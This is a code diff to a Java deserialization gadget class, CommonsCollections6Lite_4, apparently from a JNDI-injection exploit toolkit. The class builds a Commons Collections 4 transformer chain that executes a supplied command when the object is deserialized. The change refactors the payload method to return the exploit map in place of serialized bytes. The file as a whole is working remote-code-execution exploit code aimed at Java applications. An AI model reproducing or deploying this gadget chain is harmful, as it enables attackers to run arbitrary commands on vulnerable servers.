@@ -3,6 +3,11 @@ package com.nu1r.jndi.gadgets;
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.utils.Reflections;
 import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
@@ -16,7 +21,7 @@ import java.util.Map;
 
 public class CommonsCollections6Lite_4 implements ObjectPayload<Object> {
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         String        command          = param[0];
         Transformer[] fakeTransformers = new Transformer[]{(Transformer) new ConstantTransformer(1)};
         Transformer[] transformers     = (Transformer[]) TransformerUtil.makeTransformer(command);
@@ -29,19 +34,6 @@ public class CommonsCollections6Lite_4 implements ObjectPayload<Object> {
         outerMap.remove("nu1r");
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
-
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(outerMap);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return expMap;
     }
 }
